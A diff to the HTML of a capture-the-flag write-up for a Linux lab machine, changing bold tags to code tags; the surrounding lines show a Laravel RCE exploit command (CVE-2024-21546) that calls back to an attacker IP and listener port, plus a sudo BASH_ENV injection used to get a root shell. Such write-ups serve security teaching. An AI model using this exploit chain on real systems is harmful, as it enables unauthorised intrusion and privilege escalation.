@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Environment is a Hard difficulty Linux machine running a <strong>Laravel</strong> web application with a pre-production staging environment. The attack exploits <strong>CVE-2024-21546</strong> (Laravel RCE) to obtain a shell. Credential recovery is achieved by decrypting a <strong>GPG-encrypted keyvault</strong> using keys found in the user's home directory. Privilege escalation abuses a <code>sudo</code> misconfiguration with <code>BASH_ENV</code> injection.</p>
+      <p>Environment is a Hard difficulty Linux machine running a <code>Laravel</code> web application with a pre-production staging environment. The attack exploits <code>CVE-2024-21546</code> (Laravel RCE) to obtain a shell. Credential recovery is achieved by decrypting a <code>GPG-encrypted keyvault</code> using keys found in the user's home directory. Privilege escalation abuses a <code>sudo</code> misconfiguration with <code>BASH_ENV</code> injection.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full TCP port scan to discover all open ports.</p>
@@ -198,7 +198,7 @@ logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration:
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250513190822.png" alt="Upload page requiring authentication" loading="lazy" /><span class="img-caption">Upload page requiring authentication</span></div>
       <h2 class="writeup-section-title">Foothold: Laravel RCE (CVE-2024-21546)</h2>
       <h3 class="writeup-sub-title">Discovering the Pre-Production Environment</h3>
-      <p>By intercepting login requests with <strong>Burp Suite</strong> and intentionally triggering errors, the backend exposes PHP source code in error responses — revealing this is a Laravel application.</p>
+      <p>By intercepting login requests with <code>Burp Suite</code> and intentionally triggering errors, the backend exposes PHP source code in error responses — revealing this is a Laravel application.</p>
       <div class="code-block"><pre><code>POST /login HTTP/1.1
 Host: environment.htb
 Content-Length: 91
@@ -235,7 +235,7 @@ _token=n9VBfkdFX9JRMRZv74BAm2HAwA3OLytfGKSvQuEJ&amp;email=t%40t.htb&amp;password
     }
 
     $user = User::where(&amp;#039;email&amp;#039;, $email)-&amp;gt;first();</code></pre></div>
-      <p>The error response reveals a <strong>pre-production environment</strong> running at a different endpoint. I test this and successfully access it with a session cookie bypass.</p>
+      <p>The error response reveals a <code>pre-production environment</code> running at a different endpoint. I test this and successfully access it with a session cookie bypass.</p>
       <div class="code-block"><pre><code>HTTP/1.1 302 Found
 Server: nginx/1.22.1
 Content-Type: text/html; charset=utf-8
@@ -264,7 +264,7 @@ Content-Length: 418
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250613210109.png" alt="Accessing the pre-production environment" loading="lazy" /><span class="img-caption">Accessing the pre-production environment</span></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250529145137.png" alt="Redirected to the user profile page" loading="lazy" /><span class="img-caption">Redirected to the user profile page</span></div>
       <h3 class="writeup-sub-title">Exploiting CVE-2024-21546</h3>
-      <p>With access to the Laravel application, I search for an RCE exploit and find <strong>CVE-2024-21546</strong>. The exploit requires the target URL, attacker IP, a listener port, and the session cookie from the pre-production environment.</p>
+      <p>With access to the Laravel application, I search for an RCE exploit and find <code>CVE-2024-21546</code>. The exploit requires the target URL, attacker IP, a listener port, and the session cookie from the pre-production environment.</p>
       <div class="code-block"><pre><code>python3 CVE-2024-21546.py http://environment.htb 10.10.16.46 9001 eyJpdiI6ImtTZHZ2dDJrbWRwdEdzeFJHSXkwVUE9PSIsInZhbHVlIjoicUVKSk1GbUlpNHAvUjc3aEhuK21qMGsvV2lLVVhpMnJ6TlFBRURhKy9uYWRBQ2tUMHdkRVZleVpOdUFWb2k3OVl4S2hNUlFJSktlZnU3UjM5b2lRM3hIRjNRRjRqcEZheFM3TmIxWGRJZXhwa0dRYm00QnNjMGZqZFB0MGhyZzQiLCJtYWMiOiJmOWY0YWI3ZmQzYTU0NWFiMDVmYjNjOWJjNTlhOWIwN2JjYjQ5ZDMyN2U4MTczZmFhMjA4ODVjOGNiNDBlNmQyIiwidGFnIjoiIn0%3D  
 [*] Validating session...
 [+] Session is valid.
@@ -345,7 +345,7 @@ Matching Defaults entries for hish on environment:
 User hish may run the following commands on environment:
     (ALL) /usr/bin/systeminfo</code></pre></div>
       <h2 class="writeup-section-title">Privilege Escalation: BASH_ENV Injection</h2>
-      <p>As the user hish, I check <code>sudo -l</code> and discover a custom script can be run as root. I create a <code>test.sh</code> script and exploit the <strong>BASH_ENV</strong> variable — when Bash is invoked to run a script, it first sources the file pointed to by <code>BASH_ENV</code>. By setting this to a script that spawns a shell, I obtain root access.</p>
+      <p>As the user hish, I check <code>sudo -l</code> and discover a custom script can be run as root. I create a <code>test.sh</code> script and exploit the <code>BASH_ENV</code> variable — when Bash is invoked to run a script, it first sources the file pointed to by <code>BASH_ENV</code>. By setting this to a script that spawns a shell, I obtain root access.</p>
       <div class="code-block"><pre><code>hish@environment:~$ sudo -l
 [sudo] password for hish: 
 Matching Defaults entries for hish on environment:
